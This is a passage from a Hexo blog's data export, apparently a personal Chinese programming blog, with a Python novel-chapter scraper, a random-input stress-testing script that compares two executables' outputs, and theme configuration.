},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2259,"excerpt":"","more":"<p>* 爬取网站已转移</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> concurrent.futures <span class=\"keyword\">import</span> ThreadPoolExecutor</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Host = &#x27;https://www.biquke.com/bq/37/37868/&#x27;</span></span><br><span class=\"line\">Host = <span class=\"string\">&#x27;https://www.biquke.com/bq/75/75429/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">header = [</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 &#x27;</span></span><br><span class=\"line\">                   <span class=\"string\">&#x27;(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 &#x27;</span></span><br><span class=\"line\">                   <span class=\"string\">&#x27;(KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&#x27;</span>&#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geturl</span>(<span class=\"params\">url, page</span>):</span></span><br><span class=\"line\">    repeat = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            req = requests.get(Host + url, headers=header[random.randint(<span class=\"number\">0</span>, <span class=\"number\">4</span>)], timeout=<span class=\"number\">200</span>)</span><br><span class=\"line\">            req.close()</span><br><span class=\"line\">            result = req.content</span><br><span class=\"line\">            result = BeautifulSoup(result, <span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">            title = result.find(<span class=\"string\">&#x27;h1&#x27;</span>).getText()</span><br><span class=\"line\">            result = result.find(<span class=\"string\">&#x27;div&#x27;</span>, &#123;<span class=\"string\">&#x27;id&#x27;</span>: <span class=\"string\">&#x27;content&#x27;</span>&#125;).getText()</span><br><span class=\"line\">            title = re.sub(<span class=\"string\">&#x27;[\\\\/:*?&quot;&lt;&gt;|\\r\\n]+&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, title)</span><br><span class=\"line\">            print(title)</span><br><span class=\"line\">            <span class=\"keyword\">with</span> open(<span class=\"string\">&#x27;./%s/%03d&#x27;</span> % (name, page) + <span class=\"string\">&#x27; - &#x27;</span> + title + <span class=\"string\">&#x27;.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(result)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> IOError:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;第%d次重连&#x27;</span> % repeat)</span><br><span class=\"line\">            repeat += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> repeat &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                print(Host + url + <span class=\"string\">&#x27;爬取失败！&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_menu</span>():</span></span><br><span class=\"line\">    req = requests.get(Host, headers=header[random.randint(<span class=\"number\">0</span>, <span class=\"number\">4</span>)])</span><br><span class=\"line\">    html = req.content</span><br><span class=\"line\">    html = BeautifulSoup(html, <span class=\"string\">&quot;html.parser&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">global</span> name</span><br><span class=\"line\">    name = str(html.find(<span class=\"string\">&#x27;h1&#x27;</span>))[<span class=\"number\">4</span>:<span class=\"number\">-5</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(name):</span><br><span class=\"line\">        os.makedirs(name)</span><br><span class=\"line\">    html = html.find_all(<span class=\"string\">&#x27;dd&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> ThreadPoolExecutor(<span class=\"number\">1024</span>) <span class=\"keyword\">as</span> pool:</span><br><span class=\"line\">        url = []</span><br><span class=\"line\">        index = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> enumerate(html):</span><br><span class=\"line\">            url.append(j.find(<span class=\"string\">&#x27;a&#x27;</span>)[<span class=\"string\">&#x27;href&#x27;</span>])</span><br><span class=\"line\">            index.append(i)</span><br><span class=\"line\">        pool.map(geturl, url, index)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    start = time.time()</span><br><span class=\"line\">    get_menu()</span><br><span class=\"line\">    print(<span class=\"string\">&quot;耗时%s&quot;</span> % (time.time() - start))</span><br></pre></td></tr></table></figure>"},{"title":"Python对拍数据","date":"2020-04-08T08:08:24.000Z","abbrlink":"e6c29894","_content":"> Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。\n\n<!--more-->\n```py\nimport os\nimport platform\n\n\ndef generate():\n    f = open('./code/0.in', 'w')\n    \"\"\"此处写生成测试数据函数，注释内容为示例\n    T = randint(1, 1000)\n    f.writelines('%d\\n' % T)\n    lists = []\n        for i in range(T):\n        while True:\n            x = randint(1, 1e4)\n            y = randint(1, 1e4)\n            if [x, y] not in lists:\n                lists.append([x, y])\n                f.writelines('%d %d\\n' % (x, y))\n                break\n            else:\n                continue\n    \"\"\"\n    f.close()\n\n\nif platform.system() == 'Windows':\n    os.system('CHCP 65001')  # Windows先更换CodePage为UTF-8,以防乱码\ncounts = 1\nif not os.path.exists('./code'):\n    os.makedirs('code')\nwhile True:\n    if os.path.exists('./code/0.in'):\n        os.remove('./code/0.in')\n    generate()\n    if platform.system() == 'Windows':  # Windows系统可执行文件预先放置\n        ans1 = os.popen('type .\\\\code\\\\0.in|.\\\\code\\\\1.exe')\n        ans2 = os.popen('type .\\\\code\\\\0.in|.\\\\code\\\\2.exe')\n    else:   # Linux系统可执行文件预先放置\n        ans1 = os.popen('cat code/0.in | code/1')\n        ans2 = os.popen('cat code/0.in | code/2')\n    out1 = ans1.read()\n    out2 = ans2.read()\n    if out1 == out2:\n        print('第', counts, '次尝试: ', end='')\n        print(out1)\n    else:\n        break\n    counts = counts + 1\n```","source":"_posts/Python对拍数据.md","raw":"---\ntitle: Python对拍数据\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - Python\n  - 算法\nabbrlink: e6c29894\n---\n> Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。\n\n<!--more-->\n```py\nimport os\nimport platform\n\n\ndef generate():\n    f = open('./code/0.in', 'w')\n    \"\"\"此处写生成测试数据函数，注释内容为示例\n    T = randint(1, 1000)\n    f.writelines('%d\\n' % T)\n    lists = []\n        for i in range(T):\n        while True:\n            x = randint(1, 1e4)\n            y = randint(1, 1e4)\n            if [x, y] not in lists:\n                lists.append([x, y])\n                f.writelines('%d %d\\n' % (x, y))\n                break\n            else:\n                continue\n    \"\"\"\n    f.close()\n\n\nif platform.system() == 'Windows':\n    os.system('CHCP 65001')  # Windows先更换CodePage为UTF-8,以防乱码\ncounts = 1\nif not os.path.exists('./code'):\n    os.makedirs('code')\nwhile True:\n    if os.path.exists('./code/0.in'):\n        os.remove('./code/0.in')\n    generate()\n    if platform.system() == 'Windows':  # Windows系统可执行文件预先放置\n        ans1 = os.popen('type .\\\\code\\\\0.in|.\\\\code\\\\1.exe')\n        ans2 = os.popen('type .\\\\code\\\\0.in|.\\\\code\\\\2.exe')\n    else:   # Linux系统可执行文件预先放置\n        ans1 = os.popen('cat code/0.in | code/1')\n        ans2 = os.popen('cat code/0.in | code/2')\n    out1 = ans1.read()\n    out2 = ans2.read()\n    if out1 == out2:\n        print('第', counts, '次尝试: ', end='')\n        print(out1)\n    else:\n        break\n    counts = counts + 1\n```","slug":"Python对拍数据","published":1,"updated":"2020-05-11T09:40:27.011Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbj0023qse573fi9ext","content":"<blockquote>\n<p>Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。</p>\n</blockquote>\n<a id=\"more\"></a>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> platform</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">generate</span>():</span></span><br><span class=\"line\">    f = open(<span class=\"string\">&#x27;./code/0.in&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;此处写生成测试数据函数，注释内容为示例</span></span><br><span class=\"line\"><span class=\"string\">    T = randint(1, 1000)</span></span><br><span class=\"line\"><span class=\"string\">    f.writelines(&#x27;%d\\n&#x27; % T)</span></span><br><span class=\"line\"><span class=\"string\">    lists = []</span></span><br><span class=\"line\"><span class=\"string\">        for i in range(T):</span></span><br><span class=\"line\"><span class=\"string\">        while True:</span></span><br><span class=\"line\"><span class=\"string\">            x = randint(1, 1e4)</span></span><br><span class=\"line\"><span class=\"string\">            y = randint(1, 1e4)</span></span><br><span class=\"line\"><span class=\"string\">            if [x, y] not in lists:</span></span><br><span class=\"line\"><span class=\"string\">                lists.append([x, y])</span></span><br><span class=\"line\"><span class=\"string\">                f.writelines(&#x27;%d %d\\n&#x27; % (x, y))</span></span><br><span class=\"line\"><span class=\"string\">                break</span></span><br><span class=\"line\"><span class=\"string\">            else:</span></span><br><span class=\"line\"><span class=\"string\">                continue</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> platform.system() == <span class=\"string\">&#x27;Windows&#x27;</span>:</span><br><span class=\"line\">    os.system(<span class=\"string\">&#x27;CHCP 65001&#x27;</span>)  <span class=\"comment\"># Windows先更换CodePage为UTF-8,以防乱码</span></span><br><span class=\"line\">counts = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./code&#x27;</span>):</span><br><span class=\"line\">    os.makedirs(<span class=\"string\">&#x27;code&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">&#x27;./code/0.in&#x27;</span>):</span><br><span class=\"line\">        os.remove(<span class=\"string\">&#x27;./code/0.in&#x27;</span>)</span><br><span class=\"line\">    generate()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> platform.system() == <span class=\"string\">&#x27;Windows&#x27;</span>:  <span class=\"comment\"># Windows系统可执行文件预先放置</span></span><br><span class=\"line\">        ans1 = os.popen(<span class=\"string\">&#x27;type .\\\\code\\\\0.in|.\\\\code\\\\1.exe&#x27;</span>)</span><br><span class=\"line\">        ans2 = os.popen(<span class=\"string\">&#x27;type .\\\\code\\\\0.in|.\\\\code\\\\2.exe&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:   <span class=\"comment\"># Linux系统可执行文件预先放置</span></span><br><span class=\"line\">        ans1 = os.popen(<span class=\"string\">&#x27;cat code/0.in | code/1&#x27;</span>)</span><br><span class=\"line\">        ans2 = os.popen(<span class=\"string\">&#x27;cat code/0.in | code/2&#x27;</span>)</span><br><span class=\"line\">    out1 = ans1.read()</span><br><span class=\"line\">    out2 = ans2.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> out1 == out2:</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;第&#x27;</span>, counts, <span class=\"string\">&#x27;次尝试: &#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        print(out1)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    counts = counts + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1238,"excerpt":"<blockquote>\n<p>Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。</p>\n</blockquote>","more":"<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> platform</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">generate</span>():</span></span><br><span class=\"line\">    f = open(<span class=\"string\">&#x27;./code/0.in&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;此处写生成测试数据函数，注释内容为示例</span></span><br><span class=\"line\"><span class=\"string\">    T = randint(1, 1000)</span></span><br><span class=\"line\"><span class=\"string\">    f.writelines(&#x27;%d\\n&#x27; % T)</span></span><br><span class=\"line\"><span class=\"string\">    lists = []</span></span><br><span class=\"line\"><span class=\"string\">        for i in range(T):</span></span><br><span class=\"line\"><span class=\"string\">        while True:</span></span><br><span class=\"line\"><span class=\"string\">            x = randint(1, 